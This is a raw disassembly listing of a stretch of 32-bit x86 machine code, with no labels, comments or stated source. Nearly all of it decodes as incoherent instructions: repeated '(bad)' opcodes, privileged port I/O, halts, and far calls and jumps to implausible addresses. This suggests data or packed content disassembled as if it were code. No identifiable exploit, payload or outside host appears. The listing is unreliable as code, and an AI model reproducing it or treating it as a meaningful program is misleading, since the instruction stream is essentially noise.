  40cb1d:	add    eax,0x46c4007e
  40cb22:	iret   
  40cb23:	lea    eax,[esi]
  40cb25:	out    dx,al
  40cb26:	hlt    
  40cb27:	lahf   
  40cb28:	push   ss
  40cb29:	ins    DWORD PTR es:[edi],dx
  40cb2a:	icebp  
  40cb2b:	mov    ah,bl
  40cb2d:	rol    BYTE PTR [eax+0x6531dec7],0xd3
  40cb34:	dec    edi
  40cb35:	xchg   edi,eax
  40cb36:	shl    DWORD PTR [edi],0x1
  40cb39:	pop    eax
  40cb3a:	xchg   ecx,eax
  40cb3b:	arpl   WORD PTR [eiz*2-0x64d38bf6],si
  40cb42:	fs pusha 
  40cb44:	add    eax,0xc5a40014
  40cb49:	fucomip st,st(7)
  40cb4b:	std    
  40cb4c:	xchg   ebp,eax
  40cb4d:	add    ecx,edx
  40cb4f:	sub    cl,BYTE PTR [esi]
  40cb51:	or     ch,BYTE PTR [edi+0x71]
  40cb54:	xchg   edi,eax
  40cb55:	inc    esi
  40cb56:	cdq    
  40cb57:	jmp    0x74cce80c
  40cb5c:	push   ds
  40cb5d:	xor    al,0x99
  40cb5f:	jp     0x40cb1c
  40cb61:	pop    eax
  40cb62:	push   eax
  40cb63:	xlat   BYTE PTR ds:[ebx]
  40cb64:	mov    ah,0x16
  40cb66:	lea    esi,[ebx]
  40cb68:	in     al,dx
  40cb69:	adc    ch,dh
  40cb6b:	hlt    
  40cb6c:	pop    esi
  40cb6d:	adc    eax,0xf6deb006
  40cb72:	jecxz  0x40cbd1
  40cb74:	xchg   ecx,eax
  40cb75:	or     eax,0xf790d192
  40cb7a:	cld    
  40cb7b:	jp     0x40cb97
  40cb7d:	sti    
  40cb7e:	inc    edx
  40cb7f:	in     al,dx
  40cb80:	sub    al,0xfe
  40cb82:	sub    BYTE PTR ds:0xed71bfe2,bl
  40cb88:	xchg   edx,eax
  40cb89:	loope  0x40cbe8
  40cb8b:	mov    dl,0x36
  40cb8d:	mov    dl,0x90
  40cb8f:	scas   eax,DWORD PTR es:[edi]
  40cb90:	in     eax,0xae
  40cb92:	mov    DWORD PTR [edx+0x54],ebx
  40cb95:	mov    ds:0xc6bfa38,al
  40cb9a:	ins    DWORD PTR es:[edi],dx
  40cb9b:	push   ds
  40cb9c:	sbb    al,BYTE PTR [ebp+eax*4+0x35]
  40cba0:	ror    ebp,0x93
  40cba3:	stos   DWORD PTR es:[edi],eax
  40cba4:	ins    DWORD PTR es:[edi],dx
  40cba5:	dec    edi
  40cba6:	pop    esi
  40cba7:	sbb    eax,0xb9423e7f
  40cbac:	cmp    cl,BYTE PTR [ebx-0x8]
  40cbaf:	cld    
  40cbb0:	std    
  40cbb1:	cdq    
  40cbb2:	cmp    BYTE PTR [ebx],ch
  40cbb4:	(bad)  [eax-0x34]
  40cbb7:	stos   BYTE PTR es:[edi],al
  40cbb8:	fld    QWORD PTR [eax]
  40cbba:	and    ecx,DWORD PTR [eax]
  40cbbc:	in     eax,dx
  40cbbd:	cdq    
  40cbbe:	mov    ebp,0xb941cac5
  40cbc3:	lds    esp,FWORD PTR [ebx-0x6f]
  40cbc6:	int    0x9c
  40cbc8:	adc    bl,BYTE PTR [ebx+edx*8]
  40cbcb:	mov    al,gs:0x3af74b90
  40cbd1:	mov    ebx,0x6e25eb27
  40cbd6:	push   edx
  40cbd7:	stos   DWORD PTR es:[edi],eax
  40cbd8:	mov    bh,0x8e
  40cbda:	mov    ah,0x13
  40cbdc:	cwde   
  40cbdd:	mov    dh,0xd0
  40cbdf:	stos   BYTE PTR es:[edi],al
  40cbe0:	pop    esi
  40cbe1:	xchg   edx,eax
  40cbe2:	dec    esp
  40cbe3:	push   eax
  40cbe4:	mov    esi,0x7b7ebe75
  40cbe9:	mov    ah,0x3d
  40cbeb:	ror    DWORD PTR [esi+eax*4],1
  40cbee:	jle    0x40cb70
  40cbf0:	cs mov dh,0x55
  40cbf3:	jae    0x40cbb4
  40cbf5:	mov    cl,BYTE PTR [eax-0xaf6f478]
  40cbfb:	xchg   ecx,eax
  40cbfc:	in     al,0xd8
  40cbfe:	loopne 0x40cc69
  40cc00:	ret    
  40cc01:	fs out dx,al
  40cc03:	xor    eax,0x19b0d1e3
  40cc08:	loop   0x40cbc7
  40cc0a:	dec    esi
  40cc0b:	inc    esp
  40cc0c:	jge    0x40cbf0
  40cc0e:	push   0x8c231e36
  40cc13:	inc    edi
  40cc14:	xor    ah,ch
  40cc16:	cmp    eax,0x415ffe49
  40cc1b:	and    al,0x4f
  40cc1d:	mov    dh,0xf1
  40cc1f:	addr16 inc eax
  40cc21:	inc    ebx
  40cc22:	push   ecx
  40cc23:	mov    ebx,0xacb11150
  40cc28:	xor    al,0xd8
  40cc2a:	jbe    0x40cbe6
  40cc2c:	push   es
  40cc2d:	xchg   ebp,eax
  40cc2e:	pop    ss
  40cc2f:	inc    edx
  40cc30:	jp     0x40cbc4
  40cc32:	ja     0x40cc91
  40cc34:	lods   eax,DWORD PTR ds:[esi]
  40cc35:	cdq    
  40cc36:	jmp    0x2bfaccfc
  40cc3b:	out    0x23,eax
  40cc3d:	or     BYTE PTR [ebx],ch
  40cc3f:	push   edx
  40cc40:	addr16 popf 
  40cc42:	fbld   TBYTE PTR [esi]
  40cc44:	mov    cl,0x26
  40cc46:	jo     0x40cc0f
  40cc48:	imul   bh
  40cc4a:	test   ecx,esi
  40cc4c:	cmp    DWORD PTR [ecx+0x708a068b],ebx
  40cc52:	mov    ds,WORD PTR [esi-0x736e0c0b]
  40cc58:	push   esi
  40cc59:	inc    esi
  40cc5a:	adc    eax,0xd91e9c6d
  40cc5f:	aad    0xbe
  40cc61:	(bad)  
  40cc62:	xor    dl,BYTE PTR [edx-0x23c9ee08]
  40cc68:	add    DWORD PTR [ebx-0x30],ebp
  40cc6b:	mov    cl,0x20
  40cc6e:	push   ebp
  40cc6f:	psadbw mm0,mm5
  40cc72:	imul   ebp,DWORD PTR [edi+edi*2+0x58],0x4b
  40cc77:	jecxz  0x40ccc9
  40cc79:	pop    eax
  40cc7a:	outs   dx,DWORD PTR ds:[esi]
  40cc7b:	pop    ss
  40cc7c:	adc    BYTE PTR [ebx+0x36],ah
  40cc7f:	and    al,0x37
  40cc81:	pop    ecx
  40cc82:	rcl    BYTE PTR [ecx],cl
  40cc84:	adc    DWORD PTR [ebx-0x3],0xffffffff
  40cc88:	pop    esi
  40cc89:	pop    DWORD PTR [ebx+0x54db8b46]
  40cc8f:	jbe    0x40ccf3
  40cc91:	sub    eax,0x5adcd7f
  40cc96:	xor    esi,DWORD PTR [esp]
  40cc99:	sar    BYTE PTR fs:[edx+esi*8],1
  40cc9d:	or     DWORD PTR [edi+eiz*2-0x187d9151],eax
  40cca4:	push   esp
  40cca5:	enter  0x896,0x5a
  40cca9:	fidiv  DWORD PTR [eax+ebp*4]
  40ccac:	mov    ds:0x3567107c,eax
  40ccb1:	jae    0x40cc87
  40ccb3:	rol    BYTE PTR [edi],1
  40ccb5:	add    al,0xf8
  40ccb7:	jmp    0x40cc8c
  40ccb9:	nop
  40ccba:	xor    al,BYTE PTR [ebp+0xcb1ccf1]
  40ccc0:	cld    
  40ccc1:	jp     0x40cd3b
  40ccc3:	rcl    BYTE PTR [edi+0x46],cl
  40ccc6:	dec    esi
  40ccc7:	fist   WORD PTR [ebx-0x65]
  40ccca:	cwde   
  40cccb:	in     al,dx
  40cccc:	push   0x7224c0e9
  40ccd1:	xchg   edi,eax
  40ccd2:	call   0xd422:0xc1dfc514
  40ccd9:	test   eax,0x1e795308
  40ccde:	mov    edi,0x3b747fd3
  40cce3:	mov    eax,ds:0x176c5897
  40cce8:	(bad)  
  40cce9:	sub    bl,BYTE PTR [ebp-0x1e20ffd4]
  40ccef:	or     ebp,ebp
  40ccf1:	cmp    dl,0x95
  40ccf4:	(bad)  
  40ccf5:	pop    esi
  40ccf6:	sbb    eax,0x35f0724e
  40ccfb:	ins    BYTE PTR es:[edi],dx
  40ccfc:	dec    ebx
  40ccfd:	repnz mov bh,0xc4
  40cd00:	pop    edx
  40cd01:	push   eax
  40cd02:	cmp    esi,DWORD PTR [eax-0x4b1b01ce]
  40cd08:	test   al,0x5d
  40cd0a:	fnstenv [ecx]
  40cd0c:	sbb    BYTE PTR [eax-0x34],ch
  40cd0f:	idiv   DWORD PTR [eax+0x14]
  40cd12:	fsub   st(1),st
  40cd14:	aam    0x3
  40cd16:	jecxz  0x40cd76
  40cd18:	inc    ebx
  40cd19:	(bad)  
  40cd1a:	in     eax,0x16
  40cd1c:	shl    DWORD PTR ds:0x4bbf3fe9,0xa2
  40cd23:	push   0x9c465f88
  40cd28:	imul   cl
  40cd2a:	jae    0x40cd18
  40cd2c:	into   
  40cd2d:	ins    BYTE PTR es:[edi],dx
  40cd2e:	in     al,dx
  40cd2f:	into   
  40cd30:	cmp    bl,ah
  40cd32:	mov    eax,0x8d03542e
  40cd37:	cwde   
  40cd38:	ret    
  40cd39:	push   edi
  40cd3a:	addr16 mov eax,ds:0x220b
  40cd3e:	mov    al,ds:0xd6fa7121
  40cd43:	dec    esi
  40cd44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd45:	imul   edx,esi,0xffffffcb
  40cd48:	imul   ebp,DWORD PTR [edx-0x48e0490c],0xffffff90
  40cd4f:	lods   al,BYTE PTR ds:[esi]
  40cd50:	test   al,0x86
  40cd52:	call   0x5ab1:0x33b81d62
  40cd59:	add    ch,BYTE PTR [esi-0x11]
  40cd5c:	retf   
  40cd5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd5e:	rcr    DWORD PTR [edi+0x2a633fea],1
  40cd64:	dec    edi
  40cd65:	add    eax,0xc2107982
  40cd6a:	or     esp,DWORD PTR [ebx-0x56]
  40cd6d:	inc    eax
  40cd6e:	rcl    BYTE PTR [eax+ebx*8+0x6],0x7c
  40cd73:	mov    ah,0x70
  40cd75:	fld    TBYTE PTR [ebp-0x6a]
  40cd78:	push   ss
  40cd79:	add    DWORD PTR [edi+0x13],edi
  40cd7c:	pop    esi
  40cd7d:	mov    dh,0xd7
  40cd7f:	(bad)  
  40cd80:	cwde   
  40cd81:	sar    eax,cl
  40cd83:	loop   0x40cd2b
  40cd85:	sbb    cl,BYTE PTR [eax-0x7d]
  40cd88:	sub    BYTE PTR [edx+0x73a89856],al
  40cd8e:	pop    ecx
  40cd8f:	mov    eax,gs
  40cd91:	das    
  40cd92:	sbb    ebp,DWORD PTR [ebp+0x40]
  40cd95:	dec    ecx
  40cd96:	and    esp,eax
  40cd98:	jp     0x40ce04
  40cd9a:	lods   al,BYTE PTR ds:[esi]
  40cd9b:	xchg   esi,eax
  40cd9c:	jmp    FWORD PTR [ebx-0x7cbc2077]
  40cda2:	(bad)  
  40cda3:	fisubr DWORD PTR [edi]
  40cda5:	xor    BYTE PTR [eax-0x4f687d7],ah
  40cdab:	xor    BYTE PTR [ebp-0x26d7390c],0x1
  40cdb2:	lock stos DWORD PTR es:[edi],eax
  40cdb4:	push   0xffffffc3
  40cdb6:	(bad)  
  40cdb7:	lods   eax,DWORD PTR ds:[esi]
  40cdb8:	dec    edx
  40cdb9:	add    eax,0xe47e6ea8
  40cdbe:	test   DWORD PTR [edi+eiz*2-0x6f],edi
  40cdc2:	rol    DWORD PTR [ebx+0x38],1
  40cdc5:	mov    dl,0x41
  40cdc7:	jge    0x40cd5b
  40cdc9:	shr    DWORD PTR [edx+0x76],1
  40cdcc:	cmp    edi,ecx
  40cdce:	repnz xlat BYTE PTR ds:[ebx]
  40cdd0:	imul   ecx,esi,0x6b09354a
  40cdd6:	and    al,0xa0
  40cdd8:	sub    DWORD PTR [esp+eiz*4-0x2f],edx
  40cddc:	fcmovne st,st(4)
  40cdde:	mov    dl,0x50
  40cde0:	xchg   ebx,eax
  40cde1:	cmp    BYTE PTR [ebx+0x5104ff0],dl
  40cde7:	hlt    
  40cde8:	mov    DWORD PTR [ebx+edx*1+0xcd0ea28],esi
  40cdef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdf0:	aad    0x43
  40cdf2:	das    
  40cdf3:	sub    ebx,esi
  40cdf5:	jae    0x40ce2e
  40cdf7:	leave  
  40cdf8:	je     0x40cda3
  40cdfa:	jne    0x40cdf4
  40cdfc:	(bad)  
  40cdfd:	mov    DWORD PTR [ebp+0x6a],esp
  40ce00:	std    
  40ce01:	sub    cl,BYTE PTR [ebp+0x3557550]
  40ce07:	repnz or DWORD PTR [esp+ecx*2+0x22],0x91d5b5e2
  40ce10:	fwait
  40ce11:	stc    
  40ce12:	mov    edi,0x20f26506
  40ce17:	push   ss
  40ce18:	test   al,0x8d
  40ce1a:	xchg   edi,eax
  40ce1b:	pop    ebx
  40ce1c:	and    al,0xb4
  40ce1e:	aas    
  40ce1f:	ins    BYTE PTR es:[edi],dx
  40ce20:	loop   0x40ce70
  40ce22:	aam    0x71
  40ce24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce25:	(bad)
  40ce28:	ds push cx
  40ce2b:	out    0x70,eax
  40ce2d:	mov    cl,0x6d
  40ce2f:	push   ds
  40ce30:	rcr    BYTE PTR [ebx-0x39],1
  40ce33:	dec    edx
  40ce34:	pop    esp
  40ce35:	dec    ecx
  40ce36:	cs enter 0xbd1d,0x32
  40ce3b:	shr    DWORD PTR [ebx+ecx*1+0x3aeedc22],1
  40ce42:	and    dh,BYTE PTR [ebx]
  40ce44:	cwde   
  40ce45:	and    BYTE PTR [edi+0x29316769],bl
  40ce4b:	add    cl,BYTE PTR [edi+0x35870aaa]
  40ce51:	popa   
  40ce52:	mov    eax,ds:0xc7c23b1f
  40ce57:	mov    edx,0xb0b16e3e
  40ce5c:	test   al,0xe0
  40ce5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce5f:	fisub  WORD PTR [ecx+0x1fb9c76a]
  40ce65:	xchg   edi,eax
  40ce66:	jb     0x40ce6b
  40ce68:	push   ebx
  40ce69:	jl     0x40ce8f
  40ce6b:	inc    esp
  40ce6c:	and    BYTE PTR [ebx+0x63db3fb],ch
  40ce72:	sub    eax,0x17c2a4f5
  40ce77:	test   BYTE PTR [ecx+eiz*1],dh
  40ce7a:	cdq    
  40ce7b:	mov    esp,0xb1adcc2f
  40ce80:	repnz sbb BYTE PTR [eax+esi*2+0x2658c6e1],ah
  40ce88:	imul   esi,DWORD PTR [ebx+0x46],0xc9a0f2a9
  40ce8f:	das    
  40ce90:	xor    al,0x33
  40ce92:	shl    edx,0x99
  40ce95:	push   edx
  40ce96:	(bad)  
  40ce97:	dec    edx
  40ce98:	popa   
  40ce99:	inc    esp
  40ce9a:	repz not DWORD PTR [ebx+0x4bf8faa7]
  40cea1:	xor    eax,0x1dbbb806
  40cea6:	sbb    eax,0x8bb3751d
  40ceab:	rcr    dl,0xf2
  40ceae:	add    al,0xc
  40ceb0:	and    al,0x83
  40ceb2:	popa   
  40ceb3:	push   0xffffffc3
  40ceb5:	push   edi
  40ceb6:	rcl    ch,1
  40ceb8:	aad    0x28
  40ceba:	neg    esi
  40cebc:	in     al,0x5
  40cebe:	jns    0x40cf12
  40cec0:	shr    BYTE PTR [edi],0x67
  40cec3:	pop    esi
  40cec4:	dec    eax
  40cec5:	jo     0x40ceca
  40cec7:	add    DWORD PTR [edx-0x30],0xffffffa7
  40cecb:	pop    ecx
  40cecc:	push   ebx
  40cecd:	pop    esi
  40cece:	mov    eax,0xdfe542fb
  40ced3:	pop    eax
  40ced4:	sti    
  40ced5:	mov    ah,0x1
  40ced7:	fcomp  DWORD PTR [eax]
  40ced9:	stc    
  40ceda:	int3   
  40cedb:	mov    ch,0x68
  40cedd:	(bad)  
  40cede:	fcom   QWORD PTR [ebx-0x7d]
  40cee1:	std    
  40cee2:	fwait
  40cee3:	or     bx,ax
  40cee6:	jb     0x40cf63
  40cee8:	and    BYTE PTR [esi+0x66],bh
  40ceeb:	mov    esp,0x58293307
  40cef0:	or     BYTE PTR [edi],0x5e
  40cef3:	adc    eax,0x54b3440f
  40cef8:	fcomip st,st(2)
  40cefa:	(bad)  
  40cefc:	mov    esi,0xbc4947a0
  40cf01:	fs xor eax,0x882758fa
  40cf07:	jp     0x40cf1a
  40cf09:	mov    dh,BYTE PTR [edi+0x40a98516]
  40cf0f:	pop    ds
  40cf10:	inc    ecx
  40cf11:	stos   BYTE PTR es:[edi],al
  40cf12:	mov    edx,0x4d987e64
  40cf17:	arpl   WORD PTR [ebp+0x7a],bx
  40cf1a:	daa    
  40cf1b:	(bad)  
  40cf1c:	sbb    BYTE PTR ds:0x19a3edeb,ah
  40cf22:	xchg   ebp,eax
  40cf23:	lock jmp 0xd3ad:0x3eed9c52
  40cf2b:	mov    eax,ds:0xf6889188
  40cf30:	mov    dh,0xee
  40cf32:	mov    al,0x87
  40cf34:	fwait
  40cf35:	xchg   ebp,eax
  40cf36:	mov    dh,0x2c
  40cf38:	pop    ebx
  40cf39:	ins    BYTE PTR es:[edi],dx
  40cf3a:	data16 jns 0x40cf45
  40cf3d:	aam    0x97
  40cf3f:	pusha  
  40cf40:	jo     0x40cef1
  40cf42:	mov    dh,0xf9
  40cf44:	les    ebp,FWORD PTR [esi]
  40cf46:	ret    0x273a
  40cf49:	stos   BYTE PTR es:[edi],al
  40cf4a:	imul   ecx,DWORD PTR [edx],0x525e73db
  40cf50:	rcl    DWORD PTR [ebx],cl
  40cf52:	sti    
  40cf53:	dec    ebp
  40cf54:	mov    ebx,0x9d584fa5
  40cf59:	add    bh,BYTE PTR [edi]
  40cf5b:	and    al,0x43
  40cf5d:	dec    ebp
  40cf5e:	or     eax,0xe8fb216c
  40cf63:	push   esp
  40cf64:	and    eax,0x5c1eae22
  40cf69:	in     eax,dx
  40cf6a:	in     eax,0x8b
  40cf6c:	inc    ebp
  40cf6d:	int3   
  40cf6e:	mov    ecx,DWORD PTR [ebp-0x8]
  40cf71:	mov    DWORD PTR [ecx+0xc],eax
  40cf74:	mov    eax,DWORD PTR [ebp-0x30]
  40cf77:	jmp    0x40d482
  40cf7c:	iret   
  40cf7d:	(bad)  
  40cf7e:	enter  0xd5cb,0xc9
  40cf82:	fcmovnu st,st(2)
  40cf84:	rol    DWORD PTR [edx],1
  40cf86:	ficom  WORD PTR [ebx]
  40cf88:	xor    DWORD PTR [edi+0x6],0x60
  40cf8c:	loop   0x40cf40
  40cf8e:	js     0x40d008
  40cf90:	push   0x7c
  40cf92:	js     0x40d00c
  40cf94:	loopne 0x40d010
  40cf96:	stos   BYTE PTR es:[edi],al
  40cf97:	lods   al,BYTE PTR ds:[esi]
  40cf98:	out    dx,al
  40cf99:	loopne 0x40cf6e
  40cf9b:	hlt    
  40cf9c:	sbb    al,0x81
  40cf9e:	push   ecx
  40cf9f:	outs   dx,DWORD PTR ds:[esi]
  40cfa0:	sahf   
  40cfa1:	push   ebp
  40cfa2:	sub    BYTE PTR [ecx],ch
  40cfa4:	xchg   DWORD PTR [eax+0x68da8bf6],ecx
  40cfaa:	pop    eax
  40cfab:	sbb    BYTE PTR [esi+0x64e6cdc1],dl
  40cfb1:	mov    WORD PTR [edi+0x6f],es
  40cfb4:	push   ebp
  40cfb5:	and    DWORD PTR [ebp+ecx*2-0x5b8239bf],eax
  40cfbc:	retf   0x8d67
  40cfbf:	cmp    BYTE PTR [edi*1-0x1ac97d7a],ch
  40cfc6:	add    eax,0x8795b7ee
  40cfcb:	ss xchg ebx,eax
  40cfcd:	popa   
  40cfce:	and    cl,BYTE PTR [esi+ebp*2-0x13b30850]
  40cfd5:	add    al,BYTE PTR [ecx+0x6dc97176]
  40cfdb:	sub    BYTE PTR [ebx+0x57],dh
  40cfde:	or     eax,0x6427f41f
  40cfe3:	cmp    esp,DWORD PTR [edx-0x78ae97a8]
  40cfe9:	push   esi
  40cfea:	push   ds
  40cfeb:	mov    ds:0xde6969ce,al
  40cff0:	(bad)  
  40cff1:	enter  0xbeb0,0xcb
  40cff5:	test   al,0x58
  40cff7:	mov    edx,0x35cab2a9
  40cffc:	loope  0x40d065
  40cffe:	push   esi
  40cfff:	out    dx,eax
  40d000:	jo     0x40cff1
  40d002:	sar    edx,cl
  40d004:	and    al,0xea
  40d006:	(bad)  
  40d007:	in     eax,dx
  40d008:	push   cs
  40d009:	std    
  40d00a:	sub    ecx,DWORD PTR [esi]
  40d00c:	push   esp
  40d00d:	fwait
  40d00e:	mov    ch,0x22
  40d010:	shld   DWORD PTR ds:[ecx],ebx,0xee
  40d015:	(bad)  
  40d016:	int    0x37
  40d018:	arpl   cx,bp
  40d01a:	loopne 0x40d030
  40d01c:	retf   
  40d01d:	xor    dh,BYTE PTR [edi-0x5611981d]
  40d023:	mov    ds:0xc6a06b0a,eax
  40d028:	fwait
  40d029:	das    
  40d02a:	xchg   ebp,eax
  40d02b:	adc    BYTE PTR [ecx-0x2f],0x56
  40d02f:	fld    QWORD PTR [edi]
  40d031:	lock pusha 
  40d033:	retf   
  40d034:	jno    0x40d080
  40d036:	lea    eax,[edi+0x75bf6d38]
  40d03c:	retf   
  40d03d:	shl    esi,1
  40d03f:	leave  
  40d040:	adc    ecx,DWORD PTR [edx+0x18]
  40d043:	mov    esp,0x18972d2
  40d048:	aam    0x34
  40d04a:	add    ebp,DWORD PTR [ebp+0x6c8e680d]
  40d050:	jnp    0x40d044
  40d052:	xchg   DWORD PTR cs:[ebx+0x65],edi
  40d056:	jmp    0x518869d0
  40d05b:	pop    ds
  40d05c:	stos   BYTE PTR es:[edi],al
  40d05d:	stc    
  40d05e:	jl     0x40d0df
  40d060:	shl    ah,1
  40d062:	dec    eax
  40d063:	cs ret 0xd057
  40d067:	call   0xe803:0x1a19ceef
  40d06e:	aad    0xc7
  40d070:	or     bh,bh
  40d072:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d073:	mov    ds:0x27b0b2e5,eax
  40d078:	mov    ds:0x94d82ab1,eax
  40d07d:	inc    edi
  40d07e:	jne    0x40d0de
  40d080:	push   ebp
  40d081:	fimul  DWORD PTR [esi-0x4f]
  40d084:	mov    dh,al
  40d086:	or     al,0xe2
  40d088:	aaa    
  40d089:	xchg   ebp,eax
  40d08a:	and    DWORD PTR [esi-0x57],esp
  40d08d:	pop    eax
  40d08e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d08f:	push   cs
  40d090:	inc    eax
  40d091:	sahf   
  40d092:	ds jp  0x40d015
  40d095:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d096:	mov    ds:0xee2f0e7e,eax
  40d09b:	pop    ds
  40d09c:	(bad)  
  40d09e:	mov    cl,0x57
  40d0a0:	sahf   
  40d0a1:	pop    ss
  40d0a2:	push   ebp
  40d0a3:	out    0x65,eax
  40d0a5:	call   0xe311afb3
  40d0aa:	leave  
  40d0ab:	(bad)  
  40d0ac:	fst    QWORD PTR [edx-0x5a46021d]
  40d0b2:	enter  0xdf22,0x7c
  40d0b6:	xchg   ecx,eax
  40d0b7:	or     edx,DWORD PTR [edx-0x27b86f0b]
  40d0bd:	popa   
  40d0be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0bf:	test   DWORD PTR [esi],esi
  40d0c1:	jecxz  0x40d11b
  40d0c3:	adc    ebx,DWORD PTR [esp+eiz*4-0x60]
  40d0c7:	push   ds
  40d0c8:	mov    ds:0x6f15757e,eax
  40d0cd:	push   ss
  40d0ce:	mov    bh,0xc1
  40d0d0:	push   esp
  40d0d1:	or     eax,0x6aab520b
  40d0d6:	jne    0x40d0ca
  40d0d8:	imul   edi,DWORD PTR [edi+0x116ce96e],0xffffffcb
  40d0df:	pop    edi
  40d0e0:	loopne 0x40d0fa
  40d0e2:	mov    ecx,0x428e7bb3
  40d0e7:	imul   ebp,DWORD PTR [ebx+0x4bc0a269],0x7c
  40d0ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0ef:	imul   eax,DWORD PTR [esi],0x6d
  40d0f2:	mov    gs,WORD PTR [edi-0x11]
  40d0f5:	rcl    al,0x44
  40d0f8:	ficomp WORD PTR [ebx+edi*2-0x6]
  40d0fc:	inc    esp
  40d0fd:	pusha  
  40d0fe:	add    ebx,DWORD PTR [edx-0x2c]
  40d101:	cmp    al,0x53
  40d103:	push   ebx
  40d104:	add    esp,DWORD PTR [ecx+0x7b]
  40d107:	bnd js 0x40d132
  40d10a:	test   ch,dl
  40d10c:	fabs   
  40d10e:	std    
  40d10f:	pop    esi
  40d110:	lds    ecx,FWORD PTR [edx+edx*2]
  40d113:	nop
  40d114:	enter  0x31ef,0xbb
  40d118:	cld    
  40d119:	jb     0x40d13b
  40d11b:	retf   
  40d11c:	xor    eax,0x7d6320ea
  40d121:	aam    0xb6
  40d123:	push   esp
  40d124:	dec    ecx
  40d125:	jp     0x40d0b1
  40d127:	push   ecx
  40d128:	dec    esp
  40d129:	or     DWORD PTR [ebp+edx*1+0x1135960a],0x6c
  40d131:	hlt    
  40d132:	hlt    
  40d133:	cmp    esi,esi
  40d135:	mov    esi,0x490303c9
  40d13a:	sub    ebp,DWORD PTR [esp+esi*8+0x347e2a96]
  40d141:	add    BYTE PTR [ebx+0x39a2666e],al
  40d147:	daa    
  40d148:	rcl    DWORD PTR [edx-0x32],0x94
  40d14c:	popf   
  40d14d:	add    al,0x63
  40d14f:	mov    al,ds:0xb53e6d0c
  40d154:	mov    esp,0xf8409a5
  40d159:	mov    al,ds:0xe4f3631d
  40d15e:	popf   
  40d15f:	retf   
  40d160:	aad    0x2f
  40d162:	loope  0x40d18d
  40d164:	call   0xa255:0x2639ea77
  40d16b:	xchg   ecx,eax
  40d16c:	cli    
  40d16d:	add    al,BYTE PTR [edi]
  40d16f:	mov    esi,0x52951d9f
  40d174:	fnstenv [ebx]
  40d176:	add    DWORD PTR [ebx+0x21],esi
  40d179:	pop    ss
  40d17a:	jb     0x40d155
  40d17c:	dec    esi
  40d17d:	jecxz  0x40d10d
  40d17f:	cmp    eax,0x458fdfe3
  40d184:	xchg   ebx,eax
  40d185:	mov    dl,0xfe
  40d187:	(bad)  
  40d189:	push   eax
  40d18a:	je     0x40d1f3
  40d18c:	and    DWORD PTR [edi-0xf],esi
  40d18f:	push   edx
  40d190:	ret    0xaf5b
  40d193:	imul   ebx,DWORD PTR [esp+edi*8+0x2abe0a2f],0x10198368
  40d19e:	cmp    BYTE PTR [edi+0x57],dh
  40d1a1:	cmp    al,0x1c
  40d1a3:	ss cmp al,0x13
  40d1a6:	std    
  40d1a7:	xchg   ebx,eax
  40d1a8:	cmp    BYTE PTR [ebx+0x33],bh
  40d1ab:	hlt    
  40d1ac:	push   esi
  40d1ae:	loopne 0x40d160
  40d1b0:	sub    eax,0x11b211ef
  40d1b5:	pop    eax
  40d1b6:	or     DWORD PTR [esi-0x2a],eax
  40d1b9:	adc    DWORD PTR [ebx+0x2f],esi
  40d1bc:	in     eax,dx
  40d1bd:	cmp    al,0x1c
  40d1bf:	fcmovu st,st(1)
  40d1c1:	inc    esi
  40d1c2:	jle    0x40d217
  40d1c4:	retf   0xc6bc
  40d1c7:	inc    eax
  40d1c8:	xchg   DWORD PTR [ecx+0x58570915],edi
  40d1ce:	out    dx,al
  40d1cf:	mov    eax,ds:0xd54c2893
  40d1d4:	dec    esp
  40d1d5:	jo     0x40d17a
  40d1d7:	fsubr  DWORD PTR [edi+0x7755f7c0]
  40d1dd:	mov    eax,DWORD PTR [edx-0x6a]
  40d1e0:	push   cs
  40d1e1:	inc    eax
  40d1e2:	jne    0x40d214
  40d1e4:	or     DWORD PTR [ebx+edx*2],ebp
  40d1e7:	and    bl,BYTE PTR [eax+0x526dc83e]
  40d1ed:	mov    dh,0x2
  40d1ef:	arpl   WORD PTR [edx-0x67],bp
  40d1f2:	call   0x7534f75b
  40d1f7:	add    al,0xa8
  40d1f9:	push   ebx
  40d1fa:	aam    0x50
  40d1fc:	or     ch,BYTE PTR [edi]
  40d1fe:	ret    
  40d1ff:	cli    
  40d200:	dec    ebp
  40d201:	mov    DWORD PTR [esi-0x5c26b92d],eax
  40d207:	aam    0x20
  40d209:	dec    esi
  40d20a:	std    
  40d20b:	bound  edi,QWORD PTR [edi]
  40d20d:	jecxz  0x40d22f
  40d20f:	sbb    dl,BYTE PTR [eax+0x3c6fc452]
  40d215:	fucomi st,st(5)
  40d217:	add    ch,BYTE PTR [esi+0x23ddffe]
  40d21d:	stc    
  40d21e:	cmp    eax,0xcd6ef149
  40d223:	nop
  40d224:	mov    gs,WORD PTR [edi+0x29]
  40d227:	dec    edx
  40d228:	add    DWORD PTR [esi+eiz*1+0x21],edi
  40d22c:	dec    ecx
  40d22d:	sbb    ebp,0x5a5e9d2f
  40d233:	inc    esp
  40d234:	mov    dl,0x79
  40d236:	sbb    DWORD PTR [ebp+0x1e],edi
  40d239:	aad    0x23
  40d23b:	(bad)  
  40d23c:	or     esi,0xd5441e87
  40d242:	and    eax,0x1601a77
  40d247:	add    al,0x93
  40d249:	sbb    dh,BYTE PTR [eax-0x67094264]
  40d24f:	sub    edi,DWORD PTR [eax]
  40d251:	pop    ebp
  40d252:	mov    edi,0xcc96e870
  40d257:	jp     0x40d284
  40d259:	int    0x6b
  40d25b:	test   al,0x6
  40d25d:	clc    
  40d25e:	ja     0x40d289
  40d260:	mov    dl,bh
  40d262:	clc    
  40d263:	enter  0x78cd,0xf6
  40d267:	mov    DWORD PTR [ecx+edi*4],edi
  40d26a:	psubd  mm4,QWORD PTR [edi]
  40d26d:	push   esp
  40d26e:	pop    esi
  40d26f:	out    0x90,eax
  40d271:	sahf   
  40d272:	loopne 0x40d2e0
  40d274:	mov    ds:0x8b45c6f6,eax
  40d279:	mov    BYTE PTR [eax-0x9],dh
  40d27c:	dec    ebx
